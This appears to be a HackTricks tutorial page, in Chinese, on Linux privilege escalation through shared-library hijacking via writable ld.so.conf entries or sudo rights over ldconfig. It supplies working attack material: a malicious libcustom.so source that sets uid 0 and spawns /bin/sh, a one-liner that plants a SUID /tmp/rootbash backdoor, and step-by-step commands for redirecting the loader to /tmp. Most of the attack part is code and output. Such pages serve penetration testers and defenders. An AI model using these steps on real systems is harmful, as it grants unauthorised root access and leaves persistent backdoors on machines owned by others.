# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## 准备环境

在以下部分中，你可以找到我们将用于准备环境的文件代码

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **创建**这些文件到你机器上的同一文件夹中
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **复制** `libcustom.so` 到 `/usr/lib` 并刷新 cache：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查 _libcustom.so_ 是否正在从 _/usr/lib_ 被**加载**，以及你是否可以**执行**这个 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

在攻击真实目标时，验证二进制文件需要的**确切 library 名称**以及 loader **当前正在解析**的内容：
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
一些有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常 **不起作用**，因为
重定向是由你当前的 shell 完成的。请改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** binaries 在 **secure-execution mode** 下会忽略 `LD_LIBRARY_PATH`/`LD_PRELOAD`，但来自 `/etc/ld.so.conf` 的目录仍然属于受信任的 loader 配置，因此这种错误配置仍然可能影响提权程序。
- 在较新的 glibc 版本中，dynamic loader 还提供了 `--list-diagnostics`，当 hijack 行为不符合预期时，它很适合用于调试 cache 解析和 `glibc-hwcaps` 子目录选择。

## Exploit

在这个场景中，我们假设 **有人在 _/etc/ld.so.conf/_ 中的某个文件里创建了一个存在漏洞的条目**：
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱的文件夹是 _/home/ubuntu/lib_（我们对其有写入权限）。\
**下载并编译** 以下代码到该路径内：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计 **root**（或另一个特权账户）之后会执行这个存在漏洞的二进制文件，通常最好留下一个 **root-owned artifact**，而不是启动一个交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在发生特权执行之后，你可以使用 `/tmp/rootbash -p`。

现在我们已经在配置错误的路径中**创建了恶意的 libcustom library**，我们需要等待**重启**，或者等待 root 用户执行 **`ldconfig`**（_如果你可以将这个 binary 作为 **sudo** 执行，或者它有 **suid bit**，你就可以自己执行它_）。

一旦这件事发生，**重新检查** `sharedvuln` executable 正在从哪里加载 `libcustom.so` library：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所见，它正在**从 `/home/ubuntu/lib` 加载它**，如果任何用户执行它，就会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 注意，在这个示例中我们还没有提权，但通过修改执行的命令并**等待 root 或其他有特权用户执行这个有漏洞的二进制文件**，我们将能够提权。

### 其他错误配置 - 同样的 vuln

在前面的示例中，我们伪造了一个错误配置：管理员**在 `/etc/ld.so.conf.d/` 内的配置文件中设置了一个非特权文件夹**。\
但还有其他错误配置也会导致同样的 vuln；如果你对 `/etc/ld.so.conf.d`s 中的某些**config file**、`/etc/ld.so.conf.d` 目录，或者 `/etc/ld.so.conf` 文件具有**写权限**，你就可以配置出同样的 vuln 并加以利用。

## Exploit 2

**假设你对 `ldconfig` 拥有 sudo 权限**。\
你可以指定 `ldconfig` **从哪里加载 conf files**，因此我们可以利用这一点让 `ldconfig` 加载任意目录。\
所以，让我们创建加载 `"/tmp"` 所需的文件和目录：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，正如在**前一个 exploit**中所示，**在 `/tmp` 中创建恶意库**。\
最后，让我们加载该路径并检查 binary 是从哪里加载这个 library 的：
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如你所见，拥有 `ldconfig` 的 sudo 权限，你可以利用同样的漏洞。**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
